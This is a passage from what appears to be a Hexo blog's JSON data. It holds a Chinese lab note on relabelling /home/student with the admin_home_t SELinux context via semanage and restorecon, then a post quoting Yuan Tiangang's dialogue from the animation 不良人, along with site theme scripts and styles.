实验目的：修改文件的selinux上下文标签，把`/home/student`目录的selinux上下文标签替换为`/root`目录的selinux上下文标签。\n\n * 查看student目录的selinux\n\n```bash\n[root@servera home]# ls -dZ student/\nunconfined_u:object_r:user_home_dir_t:s0 student/\n```\n\n<!-- more -->\n\n**user_home_dir_t**的部分就是`/home/student`的selinux的上下文。\n\n * 查看root目录的selinux\n\n```bash\n[root@servera /]# ls -Zd /root/\nsystem_u:object_r:admin_home_t:s0 /root/\n```\n\n**admin_home_t**的部分就是`/root`的selinux的上下文。\n\n* 修改命令\n\n```bash\n[root@servera /]# semanage fcontext -a -t admin_home_t '/home/student(/.*)?'\n```\n\n`'/home/student(/.*)?'`部分后面的`(/.*)?`是固定的。\n\n* 使配置生效\n\n```bash\n[root@servera /]# restorecon -RFvv /home/student/\nRelabeled /home/student from unconfined_u:object_r:user_home_dir_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.bash_logout from unconfined_u:object_r:user_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.bash_profile from unconfined_u:object_r:user_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.bashrc from unconfined_u:object_r:user_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.ssh from unconfined_u:object_r:ssh_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.ssh/known_hosts from unconfined_u:object_r:ssh_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.ssh/authorized_keys from unconfined_u:object_r:ssh_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.bash_history from unconfined_u:object_r:user_home_t:s0 to system_u:object_r:admin_home_t:s0\n```\n\n* 再次查看student目录的selinux\n\n```bash\n[root@servera /]# ls -dZ /home/student/\nsystem_u:object_r:admin_home_t:s0 /home/student/\n```\n\n发现student目录的selinux值变成了**admin_home_t**。\n\n---","source":"_posts/seliunx.md","raw":"---\ntitle: 关于seliunx的学习过程\ndate: 2023-05-24 22:02:47\ncategories: 学习过程\ntags:\n  - Linux\n---\n\n### 修改文件SELinux的上下文\n\n#### 实验目的：修改文件的selinux上下文标签，把`/home/student`目录的selinux上下文标签替换为`/root`目录的selinux上下文标签。\n\n * 查看student目录的selinux\n\n```bash\n[root@servera home]# ls -dZ student/\nunconfined_u:object_r:user_home_dir_t:s0 student/\n```\n\n<!-- more -->\n\n**user_home_dir_t**的部分就是`/home/student`的selinux的上下文。\n\n * 查看root目录的selinux\n\n```bash\n[root@servera /]# ls -Zd /root/\nsystem_u:object_r:admin_home_t:s0 /root/\n```\n\n**admin_home_t**的部分就是`/root`的selinux的上下文。\n\n* 修改命令\n\n```bash\n[root@servera /]# semanage fcontext -a -t admin_home_t '/home/student(/.*)?'\n```\n\n`'/home/student(/.*)?'`部分后面的`(/.*)?`是固定的。\n\n* 使配置生效\n\n```bash\n[root@servera /]# restorecon -RFvv /home/student/\nRelabeled /home/student from unconfined_u:object_r:user_home_dir_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.bash_logout from unconfined_u:object_r:user_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.bash_profile from unconfined_u:object_r:user_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.bashrc from unconfined_u:object_r:user_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.ssh from unconfined_u:object_r:ssh_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.ssh/known_hosts from unconfined_u:object_r:ssh_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.ssh/authorized_keys from unconfined_u:object_r:ssh_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.bash_history from unconfined_u:object_r:user_home_t:s0 to system_u:object_r:admin_home_t:s0\n```\n\n* 再次查看student目录的selinux\n\n```bash\n[root@servera /]# ls -dZ /home/student/\nsystem_u:object_r:admin_home_t:s0 /home/student/\n```\n\n发现student目录的selinux值变成了**admin_home_t**。\n\n---","slug":"seliunx","published":1,"updated":"2024-05-03T03:55:54.885Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5gh00857zj3c9tl7xhu","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"修改文件SELinux的上下文\"><a href=\"#修改文件SELinux的上下文\" class=\"headerlink\" title=\"修改文件SELinux的上下文\"></a>修改文件SELinux的上下文</h3><h4 id=\"实验目的：修改文件的selinux上下文标签，把-home-student目录的selinux上下文标签替换为-root目录的selinux上下文标签。\"><a href=\"#实验目的：修改文件的selinux上下文标签，把-home-student目录的selinux上下文标签替换为-root目录的selinux上下文标签。\" class=\"headerlink\" title=\"实验目的：修改文件的selinux上下文标签，把/home/student目录的selinux上下文标签替换为/root目录的selinux上下文标签。\"></a>实验目的：修改文件的selinux上下文标签，把<code>/home/student</code>目录的selinux上下文标签替换为<code>/root</code>目录的selinux上下文标签。</h4><ul>\n<li>查看student目录的selinux</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@servera home]<span class=\"comment\"># ls -dZ student/</span></span><br><span class=\"line\">unconfined_u:object_r:user_home_dir_t:s0 student/</span><br></pre></td></tr></table></figure>\n\n<span id=\"more\"></span>\n\n<p><strong>user_home_dir_t</strong>的部分就是<code>/home/student</code>的selinux的上下文。</p>\n<ul>\n<li>查看root目录的selinux</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@servera /]<span class=\"comment\"># ls -Zd /root/</span></span><br><span class=\"line\">system_u:object_r:admin_home_t:s0 /root/</span><br></pre></td></tr></table></figure>\n\n<p><strong>admin_home_t</strong>的部分就是<code>/root</code>的selinux的上下文。</p>\n<ul>\n<li>修改命令</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@servera /]<span class=\"comment\"># semanage fcontext -a -t admin_home_t &#x27;/home/student(/.*)?&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p><code>&#39;/home/student(/.*)?&#39;</code>部分后面的<code>(/.*)?</code>是固定的。</p>\n<ul>\n<li>使配置生效</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@servera /]<span class=\"comment\"># restorecon -RFvv /home/student/</span></span><br><span class=\"line\">Relabeled /home/student from unconfined_u:object_r:user_home_dir_t:s0 to system_u:object_r:admin_home_t:s0</span><br><span class=\"line\">Relabeled /home/student/.bash_logout from unconfined_u:object_r:user_home_t:s0 to system_u:object_r:admin_home_t:s0</span><br><span class=\"line\">Relabeled /home/student/.bash_profile from unconfined_u:object_r:user_home_t:s0 to system_u:object_r:admin_home_t:s0</span><br><span class=\"line\">Relabeled /home/student/.bashrc from unconfined_u:object_r:user_home_t:s0 to system_u:object_r:admin_home_t:s0</span><br><span class=\"line\">Relabeled /home/student/.ssh from unconfined_u:object_r:ssh_home_t:s0 to system_u:object_r:admin_home_t:s0</span><br><span class=\"line\">Relabeled /home/student/.ssh/known_hosts from unconfined_u:object_r:ssh_home_t:s0 to system_u:object_r:admin_home_t:s0</span><br><span class=\"line\">Relabeled /home/student/.ssh/authorized_keys from unconfined_u:object_r:ssh_home_t:s0 to system_u:object_r:admin_home_t:s0</span><br><span class=\"line\">Relabeled /home/student/.bash_history from unconfined_u:object_r:user_home_t:s0 to system_u:object_r:admin_home_t:s0</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>再次查看student目录的selinux</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@servera /]<span class=\"comment\"># ls -dZ /home/student/</span></span><br><span class=\"line\">system_u:object_r:admin_home_t:s0 /home/student/</span><br></pre></td></tr></table></figure>\n\n<p>发现student目录的selinux值变成了<strong>admin_home_t</strong>。</p>\n<hr>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"修改文件SELinux的上下文\"><a href=\"#修改文件SELinux的上下文\" class=\"headerlink\" title=\"修改文件SELinux的上下文\"></a>修改文件SELinux的上下文</h3><h4 id=\"实验目的：修改文件的selinux上下文标签，把-home-student目录的selinux上下文标签替换为-root目录的selinux上下文标签。\"><a href=\"#实验目的：修改文件的selinux上下文标签，把-home-student目录的selinux上下文标签替换为-root目录的selinux上下文标签。\" class=\"headerlink\" title=\"实验目的：修改文件的selinux上下文标签，把/home/student目录的selinux上下文标签替换为/root目录的selinux上下文标签。\"></a>实验目的：修改文件的selinux上下文标签，把<code>/home/student</code>目录的selinux上下文标签替换为<code>/root</code>目录的selinux上下文标签。</h4><ul>\n<li>查看student目录的selinux</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@servera home]<span class=\"comment\"># ls -dZ student/</span></span><br><span class=\"line\">unconfined_u:object_r:user_home_dir_t:s0 student/</span><br></pre></td></tr></table></figure>","more":"<p><strong>user_home_dir_t</strong>的部分就是<code>/home/student</code>的selinux的上下文。</p>\n<ul>\n<li>查看root目录的selinux</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@servera /]<span class=\"comment\"># ls -Zd /root/</span></span><br><span class=\"line\">system_u:object_r:admin_home_t:s0 /root/</span><br></pre></td></tr></table></figure>\n\n<p><strong>admin_home_t</strong>的部分就是<code>/root</code>的selinux的上下文。</p>\n<ul>\n<li>修改命令</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@servera /]<span class=\"comment\"># semanage fcontext -a -t admin_home_t &#x27;/home/student(/.*)?&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p><code>&#39;/home/student(/.*)?&#39;</code>部分后面的<code>(/.*)?</code>是固定的。</p>\n<ul>\n<li>使配置生效</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@servera /]<span class=\"comment\"># restorecon -RFvv /home/student/</span></span><br><span class=\"line\">Relabeled /home/student from unconfined_u:object_r:user_home_dir_t:s0 to system_u:object_r:admin_home_t:s0</span><br><span class=\"line\">Relabeled /home/student/.bash_logout from unconfined_u:object_r:user_home_t:s0 to system_u:object_r:admin_home_t:s0</span><br><span class=\"line\">Relabeled /home/student/.bash_profile from unconfined_u:object_r:user_home_t:s0 to system_u:object_r:admin_home_t:s0</span><br><span class=\"line\">Relabeled /home/student/.bashrc from unconfined_u:object_r:user_home_t:s0 to system_u:object_r:admin_home_t:s0</span><br><span class=\"line\">Relabeled /home/student/.ssh from unconfined_u:object_r:ssh_home_t:s0 to system_u:object_r:admin_home_t:s0</span><br><span class=\"line\">Relabeled /home/student/.ssh/known_hosts from unconfined_u:object_r:ssh_home_t:s0 to system_u:object_r:admin_home_t:s0</span><br><span class=\"line\">Relabeled /home/student/.ssh/authorized_keys from unconfined_u:object_r:ssh_home_t:s0 to system_u:object_r:admin_home_t:s0</span><br><span class=\"line\">Relabeled /home/student/.bash_history from unconfined_u:object_r:user_home_t:s0 to system_u:object_r:admin_home_t:s0</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>再次查看student目录的selinux</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@servera /]<span class=\"comment\"># ls -dZ /home/student/</span></span><br><span class=\"line\">system_u:object_r:admin_home_t:s0 /home/student/</span><br></pre></td></tr></table></figure>\n\n<p>发现student目录的selinux值变成了<strong>admin_home_t</strong>。</p>\n<hr>"},{"title":"不良人的台词有多用心","date":"2023-09-08T02:52:19.000Z","_content":"\n### 袁天罡对话幼时假李星云\n\n从今日起，你要将他当做镜中的自己。不仅是武功，任何事情，你都要学他所学，仿他所示。\n\n为什么？\n\n因为，你们都是李星云，但也可以都不是。从现在起，谁能复唐，谁便是李唐后裔，谁，便是本帅眼中的天子。\n\n<!-- more -->\n\n### 袁天罡龙泉城下对话李星云\n\n他们便是当年建造此处的不良人？\n\n枯骨罢了，何足挂齿。\n\n这就是一将功成，万骨皆枯......\n\n将？岂可与帝王功业相比？帝王谈笑间，当一言倾天下。\n\n笑谈之间，数不尽的丰功伟绩。但笑谈之中，也是数不尽的白骨皑皑。一句话，会有多少人颠沛流离，又会有多少人魂归无处。只是因为，一个人的，一句话？但这一句话能杀人，是不是也能救人呢？其实我始终明白，龙泉不出，这些可敬的死士便会永不瞑目；大唐不复，他们的牺牲就会毫无价值。我辈身在江湖，亦逢乱世，当勇往直前无所无惧。但我也明白，这世间无不死之人，更无不衰之国。可若是辈出的能人都像你一般，一活百年，抓着已逝之势，不顾已失民心，妄图星火燎原。这天下，会变成什么样子呢？道法自然这四个字，我想世间没有人会比你更清楚它的含义。不是吗？袁天罡，三百年了，再不收手，你就没机会了。\n\n唉......你长大了，终不似当年模样。李星云，可否陪本帅，聊聊。\n\n### 天罡赋其一\n\n天下尽做饵，唯本帅执杆。三百年光阴，京师长安到东都洛阳兴亡起伏，从鼓动杨广大兴师旅到造就贞观之治，渭水之盟到大败突厥、废王立武到二圣临朝，谋天宝之乱到纵黄巢造反警示僖宗。\n臣，无不是为大唐，这其中多少苦心，多少苦难，本帅始终不曾停下脚步，却因为你，踌躇了数十年。\n\n三百年，你的每一次成功和失败，都让你很享受吧。\n\n### 沉醉不知归路，佳酿不知甘苦\n\n三百年来，除挚友李淳风，本帅不屑与任何人饮酒，但今日的你，勉强有资格与本帅平坐。本帅以此尘封三十年的佳酿，敬年轻的殿下。 如何？\n\n尚可。\n\n可惜本帅永不能知道这其中滋味了。\n\n不知也罢，苦。\n\n哈哈哈哈。哪怕是苦也好啊。\n\n### 把酒话桑麻\n\n三百年来，此世间，唯本帅一人知你，本帅也唯知你一人。你身在本帅所布之局，一路走来，虽已深谙事理洞悉时局，但你最终仍不会称帝。对吗？但你心知不遂本帅心愿，本帅定不罢休。且你清楚，就算集众人之力，也无法除掉本帅，所以单独与我进入地宫，是想等待一个变数。让本帅永远留下，对吗？而今你又多了一个原因，便是为你那死去的无名兄长，报仇。\n\n你还真是，很了解我呢！\n\n数十年，本帅眼中只有你一人，怎能不了解？\n\n### 天罡赋其二\n数十年艰辛，本帅为的并不是殿下能称帝。皇帝之名，只是个幌子罢了。乱世数十载，以至当下之势。一直以来，本帅才是那个执棋者，本帅才是那个造局人。但今日，本帅死，殿下就会知道，什么才叫真正的，天！下！大！乱！\n\n这世间，最不缺的便是狼子野心者。前有朱贼父子篡权，中有沙陀李鸦儿，岐地宋文通野心博大，现有门外诸侯权贵，暗流汹涌，尤其那李嗣源，更甚。\n\n对本帅的恐惧，是世人心中最后的枷锁。而你，便是那个开锁之人。此锁一开，天下便再无忌惮。那时，才是真正的尸山血海。而那些本不该死的人，可都是因为你而死啊。\n\n殿下，这盘棋，臣已为您开局，现在该换你来执了。四夷宾服，万邦来朝。可惜本帅，等不到您登基那天，今日就当提前行礼。\n\n高祖，太宗，高宗，玄宗，代，德，顺，武，宣，懿，僖，昭，诸君。\n\n臣！尽力了！\n\n### 恭送大帅\n\n{% dplayer \n  \"url=https://dpv.videocc.net/a2ad892af4/8/a2ad892af4a82f0ad4f5062526946108_1.mp4?pid=1694175956521X1590085\" \n  \"screenshot\" \n  \"loop=false\" \n  \"preload=auto\"\n  \"volume=0.4\"\n  \"id=46190A32F63DFF2CF0A3BB0F3293636C\" \n  \"api=https://api.prprpr.me/dplayer/\" \n  \"addition=https://api.prprpr.me/dplayer/v3/bilibili?aid=17150441\" \n%}","source":"_posts/tiangangfu.md","raw":"---\ntitle: 不良人的台词有多用心\ndate: 2023-09-08 10:52:19\ncategories: 娱乐\ntags:\n  - 不良人\n---\n\n### 袁天罡对话幼时假李星云\n\n从今日起，你要将他当做镜中的自己。不仅是武功，任何事情，你都要学他所学，仿他所示。\n\n为什么？\n\n因为，你们都是李星云，但也可以都不是。从现在起，谁能复唐，谁便是李唐后裔，谁，便是本帅眼中的天子。\n\n<!-- more -->\n\n### 袁天罡龙泉城下对话李星云\n\n他们便是当年建造此处的不良人？\n\n枯骨罢了，何足挂齿。\n\n这就是一将功成，万骨皆枯......\n\n将？岂可与帝王功业相比？帝王谈笑间，当一言倾天下。\n\n笑谈之间，数不尽的丰功伟绩。但笑谈之中，也是数不尽的白骨皑皑。一句话，会有多少人颠沛流离，又会有多少人魂归无处。只是因为，一个人的，一句话？但这一句话能杀人，是不是也能救人呢？其实我始终明白，龙泉不出，这些可敬的死士便会永不瞑目；大唐不复，他们的牺牲就会毫无价值。我辈身在江湖，亦逢乱世，当勇往直前无所无惧。但我也明白，这世间无不死之人，更无不衰之国。可若是辈出的能人都像你一般，一活百年，抓着已逝之势，不顾已失民心，妄图星火燎原。这天下，会变成什么样子呢？道法自然这四个字，我想世间没有人会比你更清楚它的含义。不是吗？袁天罡，三百年了，再不收手，你就没机会了。\n\n唉......你长大了，终不似当年模样。李星云，可否陪本帅，聊聊。\n\n### 天罡赋其一\n\n天下尽做饵，唯本帅执杆。三百年光阴，京师长安到东都洛阳兴亡起伏，从鼓动杨广大兴师旅到造就贞观之治，渭水之盟到大败突厥、废王立武到二圣临朝，谋天宝之乱到纵黄巢造反警示僖宗。\n臣，无不是为大唐，这其中多少苦心，多少苦难，本帅始终不曾停下脚步，却因为你，踌躇了数十年。\n\n三百年，你的每一次成功和失败，都让你很享受吧。\n\n### 沉醉不知归路，佳酿不知甘苦\n\n三百年来，除挚友李淳风，本帅不屑与任何人饮酒，但今日的你，勉强有资格与本帅平坐。本帅以此尘封三十年的佳酿，敬年轻的殿下。 如何？\n\n尚可。\n\n可惜本帅永不能知道这其中滋味了。\n\n不知也罢，苦。\n\n哈哈哈哈。哪怕是苦也好啊。\n\n### 把酒话桑麻\n\n三百年来，此世间，唯本帅一人知你，本帅也唯知你一人。你身在本帅所布之局，一路走来，虽已深谙事理洞悉时局，但你最终仍不会称帝。对吗？但你心知不遂本帅心愿，本帅定不罢休。且你清楚，就算集众人之力，也无法除掉本帅，所以单独与我进入地宫，是想等待一个变数。让本帅永远留下，对吗？而今你又多了一个原因，便是为你那死去的无名兄长，报仇。\n\n你还真是，很了解我呢！\n\n数十年，本帅眼中只有你一人，怎能不了解？\n\n### 天罡赋其二\n数十年艰辛，本帅为的并不是殿下能称帝。皇帝之名，只是个幌子罢了。乱世数十载，以至当下之势。一直以来，本帅才是那个执棋者，本帅才是那个造局人。但今日，本帅死，殿下就会知道，什么才叫真正的，天！下！大！乱！\n\n这世间，最不缺的便是狼子野心者。前有朱贼父子篡权，中有沙陀李鸦儿，岐地宋文通野心博大，现有门外诸侯权贵，暗流汹涌，尤其那李嗣源，更甚。\n\n对本帅的恐惧，是世人心中最后的枷锁。而你，便是那个开锁之人。此锁一开，天下便再无忌惮。那时，才是真正的尸山血海。而那些本不该死的人，可都是因为你而死啊。\n\n殿下，这盘棋，臣已为您开局，现在该换你来执了。四夷宾服，万邦来朝。可惜本帅，等不到您登基那天，今日就当提前行礼。\n\n高祖，太宗，高宗，玄宗，代，德，顺，武，宣，懿，僖，昭，诸君。\n\n臣！尽力了！\n\n### 恭送大帅\n\n{% dplayer \n  \"url=https://dpv.videocc.net/a2ad892af4/8/a2ad892af4a82f0ad4f5062526946108_1.mp4?pid=1694175956521X1590085\" \n  \"screenshot\" \n  \"loop=false\" \n  \"preload=auto\"\n  \"volume=0.4\"\n  \"id=46190A32F63DFF2CF0A3BB0F3293636C\" \n  \"api=https://api.prprpr.me/dplayer/\" \n  \"addition=https://api.prprpr.me/dplayer/v3/bilibili?aid=17150441\" \n%}","slug":"tiangangfu","published":1,"updated":"2024-05-03T12:30:32.781Z","_id":"clvq6s5gj00897zj34bvvb5q4","comments":1,"layout":"post","photos":[],"link":"","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"袁天罡对话幼时假李星云\"><a href=\"#袁天罡对话幼时假李星云\" class=\"headerlink\" title=\"袁天罡对话幼时假李星云\"></a>袁天罡对话幼时假李星云</h3><p>从今日起，你要将他当做镜中的自己。不仅是武功，任何事情，你都要学他所学，仿他所示。</p>\n<p>为什么？</p>\n<p>因为，你们都是李星云，但也可以都不是。从现在起，谁能复唐，谁便是李唐后裔，谁，便是本帅眼中的天子。</p>\n<span id=\"more\"></span>\n\n<h3 id=\"袁天罡龙泉城下对话李星云\"><a href=\"#袁天罡龙泉城下对话李星云\" class=\"headerlink\" title=\"袁天罡龙泉城下对话李星云\"></a>袁天罡龙泉城下对话李星云</h3><p>他们便是当年建造此处的不良人？</p>\n<p>枯骨罢了，何足挂齿。</p>\n<p>这就是一将功成，万骨皆枯……</p>\n<p>将？岂可与帝王功业相比？帝王谈笑间，当一言倾天下。</p>\n<p>笑谈之间，数不尽的丰功伟绩。但笑谈之中，也是数不尽的白骨皑皑。一句话，会有多少人颠沛流离，又会有多少人魂归无处。只是因为，一个人的，一句话？但这一句话能杀人，是不是也能救人呢？其实我始终明白，龙泉不出，这些可敬的死士便会永不瞑目；大唐不复，他们的牺牲就会毫无价值。我辈身在江湖，亦逢乱世，当勇往直前无所无惧。但我也明白，这世间无不死之人，更无不衰之国。可若是辈出的能人都像你一般，一活百年，抓着已逝之势，不顾已失民心，妄图星火燎原。这天下，会变成什么样子呢？道法自然这四个字，我想世间没有人会比你更清楚它的含义。不是吗？袁天罡，三百年了，再不收手，你就没机会了。</p>\n<p>唉……你长大了，终不似当年模样。李星云，可否陪本帅，聊聊。</p>\n<h3 id=\"天罡赋其一\"><a href=\"#天罡赋其一\" class=\"headerlink\" title=\"天罡赋其一\"></a>天罡赋其一</h3><p>天下尽做饵，唯本帅执杆。三百年光阴，京师长安到东都洛阳兴亡起伏，从鼓动杨广大兴师旅到造就贞观之治，渭水之盟到大败突厥、废王立武到二圣临朝，谋天宝之乱到纵黄巢造反警示僖宗。<br>臣，无不是为大唐，这其中多少苦心，多少苦难，本帅始终不曾停下脚步，却因为你，踌躇了数十年。</p>\n<p>三百年，你的每一次成功和失败，都让你很享受吧。</p>\n<h3 id=\"沉醉不知归路，佳酿不知甘苦\"><a href=\"#沉醉不知归路，佳酿不知甘苦\" class=\"headerlink\" title=\"沉醉不知归路，佳酿不知甘苦\"></a>沉醉不知归路，佳酿不知甘苦</h3><p>三百年来，除挚友李淳风，本帅不屑与任何人饮酒，但今日的你，勉强有资格与本帅平坐。本帅以此尘封三十年的佳酿，敬年轻的殿下。 如何？</p>\n<p>尚可。</p>\n<p>可惜本帅永不能知道这其中滋味了。</p>\n<p>不知也罢，苦。</p>\n<p>哈哈哈哈。哪怕是苦也好啊。</p>\n<h3 id=\"把酒话桑麻\"><a href=\"#把酒话桑麻\" class=\"headerlink\" title=\"把酒话桑麻\"></a>把酒话桑麻</h3><p>三百年来，此世间，唯本帅一人知你，本帅也唯知你一人。你身在本帅所布之局，一路走来，虽已深谙事理洞悉时局，但你最终仍不会称帝。对吗？但你心知不遂本帅心愿，本帅定不罢休。且你清楚，就算集众人之力，也无法除掉本帅，所以单独与我进入地宫，是想等待一个变数。让本帅永远留下，对吗？而今你又多了一个原因，便是为你那死去的无名兄长，报仇。</p>\n<p>你还真是，很了解我呢！</p>\n<p>数十年，本帅眼中只有你一人，怎能不了解？</p>\n<h3 id=\"天罡赋其二\"><a href=\"#天罡赋其二\" class=\"headerlink\" title=\"天罡赋其二\"></a>天罡赋其二</h3><p>数十年艰辛，本帅为的并不是殿下能称帝。皇帝之名，只是个幌子罢了。乱世数十载，以至当下之势。一直以来，本帅才是那个执棋者，本帅才是那个造局人。但今日，本帅死，殿下就会知道，什么才叫真正的，天！下！大！乱！</p>\n<p>这世间，最不缺的便是狼子野心者。前有朱贼父子篡权，中有沙陀李鸦儿，岐地宋文通野心博大，现有门外诸侯权贵，暗流汹涌，尤其那李嗣源，更甚。</p>\n<p>对本帅的恐惧，是世人心中最后的枷锁。而你，便是那个开锁之人。此锁一开，天下便再无忌惮。那时，才是真正的尸山血海。而那些本不该死的人，可都是因为你而死啊。</p>\n<p>殿下，这盘棋，臣已为您开局，现在该换你来执了。四夷宾服，万邦来朝。可惜本帅，等不到您登基那天，今日就当提前行礼。</p>\n<p>高祖，太宗，高宗，玄宗，代，德，顺，武，宣，懿，僖，昭，诸君。</p>\n<p>臣！尽力了！</p>\n<h3 id=\"恭送大帅\"><a href=\"#恭送大帅\" class=\"headerlink\" title=\"恭送大帅\"></a>恭送大帅</h3><div id=\"dplayer0\" class=\"dplayer hexo-tag-dplayer-mark\" style=\"margin-bottom: 20px;\"></div><script>(function(){var player = new 